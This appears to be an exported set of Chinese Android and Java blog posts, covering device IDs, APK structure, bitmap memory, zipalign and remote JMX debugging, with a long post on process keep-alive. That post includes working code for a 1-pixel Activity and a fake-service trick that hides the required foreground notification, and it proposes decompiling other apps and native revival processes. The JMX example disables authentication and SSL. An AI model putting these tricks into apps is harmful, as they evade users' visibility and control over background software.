如果wifi没有打开过，我们便无法获取其MAC地址 蓝牙设备只有在打开的时候才能获取MAC地址 使用UUIDUUID含义是通用唯一识别码 (Universally Unique Identifier)，是指在一台机器上生成的数字，它保证对在同一时空中的所有机器都是唯一的。UUID由以下几部分组合而成： 当前日期和时间 时钟序列 全局唯一的IEEE机器识别号（如果有网卡，从网卡获得，没有网卡以其他方式获得） 获取UUID的例子如下： 12UUID uuid = UUID.randomUUID();Log.d(\"MyLog\", uuid.toString()); 打印的log如下： 使用uuid的缺陷如下： uuid生成的结果较长 uuid需要在用户本地保存，因此有可能被篡改 使用Serial NumberSerial Number是用于辨识设备的序列号，其获取的例子如下： 1Log.d(\"MyLog\", android.os.Build.SERIAL); 打印log如下： 该方法的缺陷如下： Serial Number在没有IMEI码设备（非手机设备）上必须提供，但手机设备上可能没有 在Android 版本2.3以前可能没有Serial Number 因此，Serial Number可以结合DeviceId来使用 使用ANDROID_ID在设备首次启动时，系统会随机生成一个64位的数字，并把这个数字以16进制字符串的形式保存下来，这个16进制的字符串就是ANDROID_ID，当设备被恢复出厂设置后该值可能会被重置 获取ANDROID_ID的方法如下： 12String ANDROID_ID = Settings.System.getString(getContentResolver(), Settings.Secure.ANDROID_ID);Log.d(\"MyLog\", ANDROID_ID); 打印Log如下： 使用ANDROID_ID时，我们需要注意一下问题： 在Android 2.2版本中可能存在问题 可能有设备产生相同ANDROID_ID 由于厂商定制系统可能导致bug，返回null 综上所述，Android 手机识别的几种方法可以用下图进行总结：","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"Android APK 安装包","slug":"Android-APK-安装包","date":"2017-05-02T03:50:17.000Z","updated":"2020-05-11T07:23:44.489Z","comments":true,"path":"2017/05/02/Android-APK-安装包/","link":"","permalink":"https://superxlcr.github.io/2017/05/02/Android-APK-安装包/","excerpt":"","text":"最近本人了解了一些关于Android APK安装包的知识，在此写下一篇博客进行总结。 APK总览APK是AndroidPackage的缩写，即Android安装包(apk)。APK文件其实是zip格式，但后缀名被修改为apk，我们可以通过更改后缀名的方式来解压缩apk文件，解压后的内容如下图所示： APK内容apk文件解压后包含以下内容： （1）res目录：用于存放Android资源文件的目录，其中的文件均经过编译，有多个子目录用于区分具体的资源文件类型： anim：补间动画和逐帧动画文件 animator：属性动画文件 color：颜色文件 drawable：图片文件 layout：布局文件 menu：菜单文件 mipmap：理论上仅用于存放应用icon图标，用于主屏幕图片展示，其余图片文件应存放在drawable中 raw：原生视频、音频资源 transition：转场动画效果 xml：原生xml文件 值得注意的是，每个子目录都可以拥有标识相应分辨率与机型大小作为后缀，如“xxhdpi”，的子目录。 （2）assets目录：用于存放需要打包到APK中的静态文件，文件没有进行编译，访问时需要使用AssetManager类 （3）META-INF目录：即Metadata infomation元数据（又称中介数据、中继数据，用于描述数据的数据）信息目录，该目录下主要包含以下三个文件： MANIFEST.MF：摘要文件，列出了apk的所有文件，以及这些文件内容所对应的base64-encoded SHA1 哈希值，用于验证apk文件的完整性，判断apk是否被篡改 CERT.SF：摘要签名文件，它列出了MANIFEST.MF这个文件中每条信息的hash值，用于验证摘要文件是否被篡改 CERT.RSA：该文件保存了解密用的公钥，以及加密算法等信息 （4）AndroidManifest.xml：Android的应用配置文件，描述了应用的总体信息，需要使用的用户权限以及组件等等，已被编译 （5）classes.dex：能用于dalvik执行的字节码，由多个.class的Java字节码文件组合而成 （6）resources.arsc：资源配置文件，用于记录资源文件与资源id之间的映射关系，res/values中的信息大部分被编译在此处 （7）lib目录：Android依赖的Native库的目录，其中会根据不同的cpu架构分为多个子目录 APK编译过程APK的大致编译过程如下图所示： 编译器将源代码转换成 DEX（Dalvik Executable) 文件（其中包括运行在 Android 设备上的字节码），将所有其他内容通过aapt（Android Asset Packaging Tool） 转换成已编译资源，编译成二进制文件 APK 打包器将 DEX 文件和已编译资源合并成单个 APK APK 打包器使用调试或发布密钥库签署您的 APK 在生成最终 APK 之前，打包器会使用 zipalign 工具对应用进行优化，减少其在设备上运行时的内存占用 官方链接：https://developer.android.google.cn/studio/build/index.html APK安装过程Android的应用apk安装涉及如下几个目录： /data/app：存放用户安装的apk目录，安装时会把apk复制到这里 /data/data：应用安装完成后，会在该目录下生成与apk包名（packagename）一样的文件夹，用于存放应用数据 /data/dalvik-cache：存放apk的odex文件，便于应用启动时直接执行 具体的安装过程如下： 首先，系统会把apk复制到/data/app下，然后通过META-INF下的文件校验apk的签名是否正确，检查apk的结构是否正常，进而解压并校验dex文件。如果dex文件没有被破坏，则会把dex文件优化为odex文件，使得程序的启动时间加快，同时，在/data/data目录下建立与apk包名相同的文件夹。如果apk中有Native库，lib目录的话，系统会判断so库的名字是否正确，并根据系统cpu架构解压对应的so库到/data/data/packagename/lib下。 附，odex的内容如下所示： odex文件在原来的dex文件头添加了一些数据，在文件尾部添加了程序运行时需要的依赖库和辅助数据，使得程序运行速度加快。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"}]},{"title":"Linux Java程序debug总结","slug":"Linux-Java程序debug总结","date":"2017-04-28T04:35:52.000Z","updated":"2020-05-11T07:23:44.716Z","comments":true,"path":"2017/04/28/Linux-Java程序debug总结/","link":"","permalink":"https://superxlcr.github.io/2017/04/28/Linux-Java程序debug总结/","excerpt":"","text":"最近博主debug了远程Linux服务器上的Java程序，在此对过程中所使用的工具进行一番总结。 使用Linux shell进行debug通过putty登录到Linux服务器，我们可以使用Linux上的shell命令进行debug。 首先我们可以使用 1ps -e 指令来确认Java进程的pid： 然后我们可以使用 1top -p pid 来查看该进程所消耗的内存，与cpu占用情况： 在确认我们Java程序所在进程出现问题后，我们使用如下指令来查看进程中线程的时间消耗情况： 1ps -mp pid -o THREAD,tid,time 通过对比各个线程消耗CPU时间的多少我们可以大致判定出问题所在线程，首先我们先把线程号转化为16进制格式： 1printf &quot;%x\\n&quot; tid 然后通过jstack指令打印线程运行信息： 1jstack pid |grep tid -A 30 上述指令的意思为：打印pid进程的Java运行信息，截取带有tid线程号的行并输出其后30行的信息 使用jvisualvm进行远程debug首先我们需要修改Linux 服务器上的/etc/hosts文件，把对应的hostname改为机器的外网ip： 1vi /etc/hosts 然后在我们启动Java进程时加上以下配置参数： 12345-Djava.rmi.server.hostname=xxx.xxx.xxx.xxx # Linux主机外网ip-Dcom.sun.management.jmxremote-Dcom.sun.management.jmxremote.port=28888 # 通信端口，在jvisualvm中需要填入-Dcom.sun.management.jmxremote.authenticate=false # 不需要用户名密码登录-Dcom.sun.management.jmxremote.ssl=false 然后我们启动jvisualvm，该工具为JDK自带，在JDK安装目录/bin目录下。打开后我们使用远程监控： 右键添加远程主机，输入ip添加完成。然后再右键添加JMX连接，输入对应的ip:port即可。 通过jvisualvm，我们既可以查看Java虚拟机总体的资源使用情况： 又可以查看其中每个线程的状况，必要时还可以dump内存进行debug：","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"通信","slug":"通信","permalink":"https://superxlcr.github.io/tags/通信/"},{"name":"linux","slug":"linux","permalink":"https://superxlcr.github.io/tags/linux/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"Android 图片总结","slug":"Android-图片总结","date":"2017-04-27T11:11:32.000Z","updated":"2020-05-11T07:23:44.532Z","comments":true,"path":"2017/04/27/Android-图片总结/","link":"","permalink":"https://superxlcr.github.io/2017/04/27/Android-图片总结/","excerpt":"","text":"最近了解了一些关于Android图片相关的知识，在此写一篇博客进行总结。 图片使用场景图片有两种使用的场景： 在硬盘上的存储格式，即JPG、PNG等 在内存的展开格式，即Bitmap 内存中的图片因为需要知道图片的所有信息，所有在内存中，图片一般是完全展开的（未压缩的）。 对于支持透明度的BItmap来说，对于图片上的每一个像素点，我们的颜色属性由R（红）、G（绿）、B（蓝）三色组成，而透明度属性由A（alpha值）表示。由于我们的图片在内存中是完全展开的，因此图片Bitmap在内存中占用的大小为：图片宽 X 图片高 X 图片每像素大小（一般而言是4byte，ARGB分别使用8bit进行表示）。 硬盘上的图片对于硬盘上的图片，我们并不会像在内存那样直接存储图片，我们会对图片进行一定的压缩以节省空间。目前来说，比较常见的压缩格式有两种： PNG：可移植网络图形格式(Portable Network Graphic Format)，这是一种无损的图片压缩格式，带有透明度值（A），一般而言会比较大。 JPG：它是一种有损压缩，不带透明值，在不影响图片使用的情况下会丢弃一部分的信息，一般来说肉眼区分不出来。 一般而言，对于同一张bitmap保存为JPG会比保存为PNG小得多，因此一般网络上使用JPG格式的图片较多。 Android中的图片在Android系统中，图片文件以Bitmap对象的形式存在，一般而言我们都会使用BitmapFactory工厂类来创建我们的Bitmap对象。在使用BitmapFactory的静态方法创建Bitmap时，我们都会涉及一个BitmapFactory.Options参数类用来控制解析图片文件的过程，其中的比较重要的参数有： inDensity：bitmap使用的像素密度 inJustDecodeBounds：如果设置为true，BitmapFactory解析不会返回Bitmap，不会占用内存，但可以从Options获取图片的大小类型等信息，用于加载大图片时获取尺寸用 inPreferredConfig：设置图片的解析类型，设置图片每个像素用多少字节表示，一般而言默认解析类型为ARGB_8888 inSampleSize：设置图片的缩小倍数，若设置为4，则会返回长宽各为原图1/4，图片大小为1/16的bitmap outHeight、outWidth：用于设置了inJustDecodeBounds时获取图片大小尺寸 outMimeType：用于获取图片的MIME类型 图片的解析类型，在内存中的展开类型有以下几种： ALPHA_8：每像素只存储alpha通道（透明度），因此每像素只占用1字节 ARGB_4444：每像素存储alpha，red，green，blue四通道，每种通道占用4bit，因此每像素占用2字节，由于显示图片效果不佳已弃用 ARGB_8888：与ARGB_4444相似，但每种通道占用1字节，每像素占用4字节，为默认解析类型 RGB_565：三通道，R通道占用5bit，G通道占用6bit，B通道占用5bit，每像素占用2字节 Android中bitmap的大小在Android中解析的Bitmap对象，我们可以通过调用getAllocationByteCount方法来获取该图片在内存中占用的大小。 在了解如何计算bitmap内存大小前，我们需要先了解关于Android分辨率的一些知识：Android 关于dp dip sp px dpi density解析 下面给出例子： 123456BitmapFactory.Options options = new BitmapFactory.Options();options.inPreferredConfig = Bitmap.Config.RGB_565;Bitmap bitmap = BitmapFactory.decodeResource(getResources(), R.mipmap.test, options);Log.d(\"MyLog\", bitmap.getWidth() + \"\");Log.d(\"MyLog\", bitmap.getHeight() + \"\");Log.d(\"MyLog\", bitmap.getAllocationByteCount() + \"\"); 我们在MX4手机中（屏幕大小为1920 x 1152，属于超超高分辨率，xxhdpi），解析了一张test.jpg图片。test 图片信息如下，被我们存放在mipmap的mdpi子目录中，大小为203 x 300： 打印的Log如下： 由log可以看到，bitmap占用的内存为1096200byte，该值的计算过程如下：首先图片的原始大小为 203 x 300，但该图片是存放在mdpi目录下的，而我们的手机为xxhdpi分辨率，因此图片在解析时会有一定的扩展（mdpi ：xxhdpi = 4 ：12）：解析出来图片的宽高为609 x 900（203 / 4 x 12，300 / 4 x 12）。再者，由于图片本身为JPG类型，没有alpha通道，因此我们在解析图片的类型时也选择了没有alpha通道的RGB_565类型，每像素占用的内存大小为2字节：因此，综上所述图片占用的内存为：609 x 900 x 2 = 1096200（byte）","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"应用","slug":"应用","permalink":"https://superxlcr.github.io/tags/应用/"},{"name":"内存","slug":"内存","permalink":"https://superxlcr.github.io/tags/内存/"}]},{"title":"Android APK对齐总结","slug":"Android-APK对齐总结","date":"2017-04-24T14:23:10.000Z","updated":"2020-05-11T07:23:44.491Z","comments":true,"path":"2017/04/24/Android-APK对齐总结/","link":"","permalink":"https://superxlcr.github.io/2017/04/24/Android-APK对齐总结/","excerpt":"","text":"本人最近了解了一些关于Android APK对齐的知识，在此写篇博客总结一下： 什么是字节对齐所谓的字节对齐，就是各种类型的数据按照一定的规则在空间上排列，而不是顺序的一个接一个的排放，这个就是对齐。我们经常听说的对齐在N上（N字节对齐），它的含义就是：数据的存放起始地址%min（N，数据字节大小）== 0。 需要字节对齐的根本原因在于CPU访问数据的效率问题，数据字节对齐后可以减少CPU访问内存的次数，但相应的，字节对齐也增加了内存空间的消耗（存在某些空内存没被使用）。 什么是Zipalign首先给出官方链接：https://developer.android.google.cn/studio/command-line/zipalign.htmlzipalign是Android SDK中的一个用于优化APK的新工具，它提高了优化后的Applications与Android系统的交互效率，从而可以使整个系统的运行速度有了较大的提升。根据官方文档的描述，Android系统中应用的数据都保存在它的APK文件中，这些文件经常会被多个进程访问： 安装程序通过每个apk的manifest文件获取与当前应用程序相关联的permissions信息 Home程序读取当前APK的名称和图标等信息 System server读取一些与应用运行相关信息 APK所包含的内容不仅限于当前应用所使用，而且可以被其它的应用通过内容提供器调用 zipalign优化的最根本目的是帮助操作系统更高效率的根据请求索引资源，通过将apk中的未压缩数据进行字节对齐（一般为4字节对齐），允许系统使用mmap方法直接映射文件至内存空间，降低内存的消耗。 如何使用Zipalign一般来说，Android Studio会自动帮你进行zipalign相关的优化。 手动进行优化时，zipalign所在的位置为：sdk目录/build-tools/对应版本号，不同的Android版本对应着不同的zipalign工具。 对齐一个apk文件的方法如下：对齐infile.apk并输出为outfile.apk 1zipalign [-f] [-v] &lt;alignment&gt; infile.apk outfile.apk 验证一个apk文件是否对齐的方法如下： 1zipalign -c -v &lt;alignment&gt; existing.apk &lt;alignment&gt;指的是字节对齐参数，一般来说这个参数的值均为4，否则它起不到任何作用。 其他参数： -f：输出覆盖已存在的outfile.zip文件 -v：输出详细的日志 -p：outfile.zip should use the same page alignment for all shared object files within infile.zip（这句并非相当理解……） -c：确认apk是否对齐","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"资源文件","slug":"资源文件","permalink":"https://superxlcr.github.io/tags/资源文件/"}]},{"title":"Android进程保活总结","slug":"Android进程保活总结","date":"2017-04-24T07:44:40.000Z","updated":"2020-05-11T07:23:44.606Z","comments":true,"path":"2017/04/24/Android进程保活总结/","link":"","permalink":"https://superxlcr.github.io/2017/04/24/Android进程保活总结/","excerpt":"","text":"最近学习了关于Android进程保活的相关知识，在此写下一篇博客总结下。 Android 进程优先级如果需要保证我们的应用所在进程存活，那么我们就应该先了解一下Android系统中进程的分类。在Android中，进程依据重要性被分为5级，越高级的进程越重要，在内存不够回收进程时也会越晚被回收： 前台进程（Foreground process）：指用户当前操作必须的进程。一般来说，系统中仅存在极少的前台进程，而且它们会到最后才被回收掉。拥有以下特征的进程被视为前台进程： 拥有Activity运行在屏幕最前端的进程。（已调用Activity的onResume方法） 拥有正在运行的BroadcastReceiver的进程。（已调用BroadcastReceiver的onReceive方法） 拥有正在执行的Service的回调方法的进程。（Service的onCreate、onStart、onDestroy方法） 可见进程（Visible process）：正在执行某些用户可见操作的进程。当杀死这些进程时，用户会有一定的影响。拥有以下特征的进程被视为可见进程： 拥有可视的，但不是在前台的Activity。（已调用onPause方法）（当另一个个Activity设置为dialog模式时可能出现这种情况） 拥有一个前台Service。（通过用startForeground） 拥有系统关键特性的Service，如动态壁纸、输入法等服务。 服务进程（Service process）：拥有一个正在运行的Service的进程。通常这种进程都是不可见的，会在运行较长的时候后考虑降级回收掉。后台进程（Background process）：这是一种对用户体验没有直接影响的进程，系统会在需要内存的时候随时回收这种进程，这种进程通常会持有一个已调用onStop方法的Activity。空进程（Empty process）：不含任何活动应用组件的进程。保留这种进程的的唯一目的是用作缓存，以缩短下次在其中运行组件所需的启动时间。 为使总体系统资源在进程缓存和底层内核缓存之间保持平衡，系统往往会终止这些进程。 更多详细的进程优先级内容可以参考Android官方文档：https://developer.android.com/guide/topics/processes/process-lifecycle.htmlhttps://developer.android.com/guide/components/processes-and-threads.html Android 进程回收策略众所周知，Android是基于Linux系统的。在Android进程回收策略中，Android进程与Linux进程根据OOM_ADJ阈值进行区分： OOM_ADJ &gt;= 4：比较容易被杀死的进程 OOM_ADJ 0 ~ 3：不容易被杀死的进程 OOM_ADJ &lt; 0 ：纯Linux进程，非Android进程 当Android系统察觉设备内存不足时，会按照阈值从大到小杀死进程。 具体的oom_adj值的意义我们可以查看AOSP中的com.android.server.am.ProcessList 文件（其中本人添加了一些中文注释）： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788/** * Activity manager code dealing with processes. */final class ProcessList &#123; ... // OOM adjustments for processes in various states: // Adjustment used in certain places where we don't know it yet. // (Generally this is something that is going to be cached, but we // don't know the exact value in the cached range to assign yet.) // 未知进程，通常是用作缓存 static final int UNKNOWN_ADJ = 16; // This is a process only hosting activities that are not visible, // so it can be killed without any disruption. // 拥有不可视的Activity的进程，可以不影响影响用户的情况下杀掉 static final int CACHED_APP_MAX_ADJ = 15; static final int CACHED_APP_MIN_ADJ = 9; // The B list of SERVICE_ADJ -- these are the old and decrepit // services that aren't as shiny and interesting as the ones in the A list. // 一些旧的服务进程 static final int SERVICE_B_ADJ = 8; // This is the process of the previous application that the user was in. // This process is kept above other things, because it is very common to // switch back to the previous app. This is important both for recent // task switch (toggling between the two top recent apps) as well as normal // UI flow such as clicking on a URI in the e-mail app to view in the browser, // and then pressing back to return to e-mail. // 用户使用的前一个进程 static final int PREVIOUS_APP_ADJ = 7; // This is a process holding the home application -- we want to try // avoiding killing it, even if it would normally be in the background, // because the user interacts with it so much. // 主界面进程 static final int HOME_APP_ADJ = 6; // This is a process holding an application service -- killing it will not // have much of an impact as far as the user is concerned. // 持有应用服务的进程 static final int SERVICE_ADJ = 5; // This is a process with a heavy-weight application. It is in the // background, but we want to try to avoid killing it. Value set in // system/rootdir/init.rc on startup. // 重量级应用进程 static final int HEAVY_WEIGHT_APP_ADJ = 4; // This is a process currently hosting a backup operation. Killing it // is not entirely fatal but is generally a bad idea. // 执行备份操作的进程 static final int BACKUP_APP_ADJ = 3; // This is a process only hosting components that are perceptible to the // user, and we really want to avoid killing them, but they are not // immediately visible. An example is background music playback. // 拥有用户可感知组件的进程 static final int PERCEPTIBLE_APP_ADJ = 2; // This is a process only hosting activities that are visible to the // user, so we'd prefer they don't disappear. // 拥有用户仅可见、不可交互的Activity的进程 static final int VISIBLE_APP_ADJ = 1; // This is the process running the current foreground app. We'd really // rather not kill it! // 前台运行的进程 static final int FOREGROUND_APP_ADJ = 0; // This is a system persistent process, such as telephony. Definitely // don't want to kill it, but doing so is not completely fatal. // 系统常驻进程 static final int PERSISTENT_PROC_ADJ = -12; // The system process runs at the default adjustment. // 系统进程 static final int SYSTEM_ADJ = -16; // Special code for native processes that are not being managed by the system (so // don't have an oom adj assigned by the system). // 为native进程保留，他们不被系统管理 static final int NATIVE_ADJ = -17; ...&#125; Android 进程被杀死情况一般来说，Android进程被杀死有以下几种情况： 触发系统进程管理机制回收（Lowmemorykiller）：这种方法会按照阈值从大到小进行清理 被没有进行Root的第三方应用杀死（使用killBackgroundProcess方法）：这种方法只能杀死OOM_ADJ为4以上的进程 被进行Root的第三方应用杀死（使用force-stop或者kill）：理论上来说可以杀死所有进程，但一般只会清理非系统关键进程和非前台可见进程 厂商的杀进程功能（force-stop或者kill）：理论上来说可以杀死所有进程，包括Linux原生进程 用户主动“强行停止”进程（force-stop）：只能停用第三方和非system/phone进程应用（停用system进程应用会造成Android系统重启） Android 进程保活思路在了解完Android进程的优先级与Android进程的回收策略后，我们保活Android进程的思路就有了两方面： 通过提升Android进程优先级，使得进程更难以被回收 通过某些特殊的机制，在进程死后将其拉活 提升Android进程的优先级利用Activity提升进程等级在某些启用后台服务场景中，为了防止我们的应用被第三方应用或系统管理工具在锁屏后为省电而被杀死，我们可以通过启动一像素大小的界面来提升进程等级，让进程等级从后台进程提升到前台进程。 1像素Activity： 1234567891011121314151617181920212223242526272829303132public class OnePixelActivity extends Activity &#123; private static final String TAG = \"MyLog\"; public static OnePixelActivity instance = null; @Override protected void onCreate(@Nullable Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_one_pixel); Window window = getWindow(); // 放在左上角 window.setGravity(Gravity.START | Gravity.TOP); WindowManager.LayoutParams layoutParams = window.getAttributes(); // 宽高为1px layoutParams.width = 1; layoutParams.height = 1; // 起始坐标 layoutParams.x = 0; layoutParams.y = 0; window.setAttributes(layoutParams); instance = this; Log.d(TAG, \"activity onCreate\"); &#125; @Override protected void onDestroy() &#123; instance = null; Log.d(TAG, \"activity onDestroy\"); super.onDestroy(); &#125;&#125; 编写广播接收器监听锁屏和解锁action： 1234567891011121314151617181920212223242526272829public class ScreenBroadcastReceiver extends BroadcastReceiver &#123; private static final String TAG = \"MyLog\"; @Override public void onReceive(Context context, Intent intent) &#123; String action = intent.getAction(); switch (action) &#123; case Intent.ACTION_SCREEN_ON: &#123; // Log.d(TAG, \"screen_on\"); // 关闭一像素Activity if (OnePixelActivity.instance != null) &#123; OnePixelActivity.instance.finish(); &#125; break; &#125; case Intent.ACTION_SCREEN_OFF: &#123; Log.d(TAG, \"screen_off\"); // 开启一像素Activity Intent activityIntent = new Intent(context, OnePixelActivity.class); activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); context.startActivity(activityIntent); break; &#125; default: break; &#125; &#125;&#125; 值得注意的是Intent.ACTION_SCREEN_ON与Intent.ACTION_SCREEN_OFF只有通过Context.registerReceiver方法注册的广播接收器才能监听到，官方解释如下： SCREEN_ON屏幕亮起同上，在此就不给出展示了。 下面给出Service的例子，我们在启动服务时使用registerReceiver注册监听器，然后在注销服务时注销监听器： 123456789101112131415161718192021222324252627282930public class WorkService extends Service &#123; private static final String TAG = \"MyLog\"; private ScreenBroadcastReceiver receiver; @Nullable @Override public IBinder onBind(Intent intent) &#123; return null; &#125; @Override public void onCreate() &#123; super.onCreate(); Log.d(TAG, \"service onCreate\"); receiver = new ScreenBroadcastReceiver(); IntentFilter intentFilter = new IntentFilter(); intentFilter.addAction(Intent.ACTION_SCREEN_ON); intentFilter.addAction(Intent.ACTION_SCREEN_OFF); registerReceiver(receiver, intentFilter); &#125; @Override public void onDestroy() &#123; Log.d(TAG, \"service onDestroy\"); unregisterReceiver(receiver); super.onDestroy(); &#125;&#125; 主Activity启动服务后关闭自身，模拟没有Activity的情况： 1234567891011public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Intent intent = new Intent(this, WorkService.class); startService(intent); finish(); &#125;&#125; 通过adb shell可以看到，在锁屏前应用所处的进程oom_adj值是较高的，锁屏后由于启动了Activity，oom_adj值降低了，进程的等级得到了相应的提高，变得更难以被回收了，这样可以一定程度上缓解我们的应用被第三方应用或系统管理工具在锁屏后为省电而被杀死的情况： 利用Notification提升权限与第一种方法相似，这种方法也适用于Service在后台提供服务的场景。由于没有Activity的缘故，我们Service所在进程的oom_adj值通常是较高的，进程等级较低，容易被系统回收内存时清理掉。这时我们可以通过startForeground方法，把我们的服务提升为前台服务，提高进程的等级。但提升为前台服务必须绑定一个相应的Notification，这是我们不愿意看到的。此时我们可以先使用一个Fake Service来绑定某一个Notification，然后利用相同的id绑定我们真正的Service，然后关闭我们的Fake Service，此时我们的Notification会随着我们的Fake Service一齐关闭，但我们真正的Service仍依然处于前台运行状态，进程等级就得到了相应的提升。 FakeService代码： 12345678910111213141516171819202122232425262728293031323334353637383940public class FakeService extends Service &#123; private static final String TAG = \"MyLog\"; public static FakeService instance = null; @Nullable @Override public IBinder onBind(Intent intent) &#123; return null; &#125; @Override public void onCreate() &#123; super.onCreate(); Log.d(TAG, \"fake service onCreate\"); // 保存实例 instance = this; // 开启服务前台运行 Notification.Builder builder = new Notification.Builder(this); builder.setSmallIcon(R.mipmap.ic_launcher) .setContentTitle(\"fake\") .setContentText(\"I am fake\") .setWhen(System.currentTimeMillis()); startForeground(1, builder.build()); // 开启真正工作的Service Intent intent = new Intent(this, WorkService.class); startService(intent); &#125; @Override public void onDestroy() &#123; Log.d(TAG, \"fake service onDestroy\"); // 清除实例 instance = null; // 关闭Notification stopForeground(true); super.onDestroy(); &#125;&#125; WorkService（工作的Service）代码如下： 12345678910111213141516171819202122232425262728293031public class WorkService extends Service &#123; private static final String TAG = \"MyLog\"; @Nullable @Override public IBinder onBind(Intent intent) &#123; return null; &#125; @Override public void onCreate() &#123; super.onCreate(); Log.d(TAG, \"work service onCreate\"); // 开启服务前台运行，id与FakeService相同均为1 Notification.Builder builder = new Notification.Builder(this); builder.setSmallIcon(R.mipmap.ic_launcher) .setContentTitle(\"fake\") .setContentText(\"I am fake\") .setWhen(System.currentTimeMillis()); startForeground(1, builder.build()); // 关闭FakeService，关闭Notification FakeService.instance.stopSelf(); &#125; @Override public void onDestroy() &#123; Log.d(TAG, \"work service onDestroy\"); super.onDestroy(); &#125;&#125; 主Activity依旧，开启Service后关闭： 1234567891011public class MainActivity extends AppCompatActivity &#123; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); Intent intent = new Intent(this, FakeService.class); startService(intent); finish(); &#125;&#125; 运行输出日志如下所示： 进程的等级如下： oom_adj值为2，进程为拥有前台服务的可见进程。 在Android进程死后进行拉活对于Android进程的保活，除了使我们的进程更难以被杀死外，我们还可以通过某些方法在我们的进程被杀死后将其救活。 利用系统广播拉活我们可以在Manifest中注册广播接收器监听系统广播，在接收到广播时查看我们的进程是否被回收，如果被回收则进行自启。不过需要注意的是，并非所有广播都能被Manifest注册的广播接收器接收到，有些类似于SCREEN_ON等广播只有通过Context.registerReceiver方法注册的广播接收器才能接收到，具体的我们可以查看Android官方的文档说明。 该方法的缺陷也很明显：首先，广播接收器被管理软件、系统软件通过“自启管理”等功能禁用的场景无法接收到广播，从而无法自启；其次，这种方法也无法保证进程挂掉后立即拉活。 利用第三方应用广播拉活这种方法与利用系统广播拉活类似，我们通过反编译第三方的热门应用，监听外发广播拉活我们的进程。 不过该方法也有缺陷：首先，能了解到有什么外发广播取决于我们反编译应用的多少；其次，在这些应用更新版本后，外发广播可能会取消掉，因此并不是特别可靠。 利用系统Service机制拉活当我们使用Service时，可以通过重写onStartCommand方法的返回值来保证我们的进程被杀死后重启。总的来说，返回值有以下4个： 当我们返回了START_NOT_STICKY时，我们的Service所在进程被杀死后将不会被重启。 当我们返回了START_REDELIVER_INTENT时，我们得Service所在进程被杀死后，系统将会重启我们的Service，并且在调用onStartCommand方法时，会发送最后传送的Intent。 当我们返回START_STICKY时，如果我们的Service所在进程被杀死了，系统会自动重启我们的Service，不过在onStartCommand方法中有可能会传输null的Intent参数。START_STICKY_COMPATIBILITY与START_STICKY类似，是其兼容的版本，该参数并不保证onStartCommand方法会被调用。 测试例子如下： 1234567891011121314151617181920212223public class WorkService extends Service &#123; private static final String TAG = \"MyLog\"; @Nullable @Override public IBinder onBind(Intent intent) &#123; return null; &#125; @Override public void onCreate() &#123; super.onCreate(); Log.d(TAG, \"work service onCreate\"); &#125; @Override public int onStartCommand(Intent intent, int flags, int startId) &#123; Log.d(TAG, \"work service onStartCommand\"); Log.d(TAG, \"work service onStartCommand intent :\" + intent); return START_REDELIVER_INTENT; &#125;&#125; START_REDELIVER_INTENT效果：首次运行： 然后我们在adb shell中使用kill指令把该进程杀死。 在杀死进程一段时间后，服务进程被自动重启了，此时Intent参数是非空的： START_STICKY效果，我们把代码中onStartCommand的返回值改成了START_STICKY：首次运行效果相同，故不再截图。然后我们依旧在adb shell中使用kill指令把该进程杀死。 在杀死进程一段时间后，服务进程被自动重启了，但此时Intent变成了空值： START_STICKY_COMPATIBILITY效果，我们把代码中onStartCommand的返回值改成了START_STICKY_COMPATIBILITY： 首次运行效果相同，故不再截图。然后我们依旧在adb shell中使用kill指令把该进程杀死。 在杀死进程一段时间后，服务进程被自动重启了，但此时Service只执行了onCreate方法，并没有执行onStartCommand方法： 不过该方法也存在着一定的缺陷：首先，如果短时间内Service被杀死多次，那么我们的系统将不再拉起进程；其次，如果我们的进程被取得Root权限的管理工具或系统工具通过force-stop指令停止掉时，将无法重启。 利用Native进程拉活这种方法原理是：利用Linux中的fork机制创建一个Native进程，在Native进程中监控主进程的存活，当主进程挂掉后，在Native进程中立即对主进程进行拉活 这种方法具有几项挑战： Native进程如何感知主进程的死亡：利用文件锁，而非轮询来判断主进程是否死亡，有利于性能 Native进程如何拉活主进程：通过am命令进行拉活，并指定“–include-stopped-packages”参数来拉活主进程处于force-stop状态的情况 如何保证Native进程的唯一：设计成C/S模式，主进程与Native进程通过Localsocket进行通信 除上述列出的挑战外，在实际编写过程中还有很多的问题等着我们去解决，由于博主学识尚浅，在此无法编码举例，只能推荐两篇博客供学习： Android 进程常驻（3）—-native保活5.0以下方案推演过程以及代码详述 Android 进程常驻（4）—-native保活5.0以上方案推演过程以及代码详述 利用JobScheduler机制拉活JobService和JobScheduler是Android5.0（API 21）引入的新API，我们可以通过该机制来拉活我们的Service所在进程。 首先我们通过继承JobService类来实现自己的Service，记得重写onStartJob和onStopJob方法。然后我们在onCreate方法里面通过JobScheduler来调度我们的Service，值得注意的是需要把参数设置为Persisted： 12345678910111213141516171819202122232425262728public class MyJobService extends JobService &#123; private static final String TAG = \"MyLog\"; @Override public void onCreate() &#123; super.onCreate(); Log.d(TAG, \"onCreate\"); JobInfo.Builder builder = new JobInfo.Builder(1, new ComponentName(this, MyJobService.class)); // 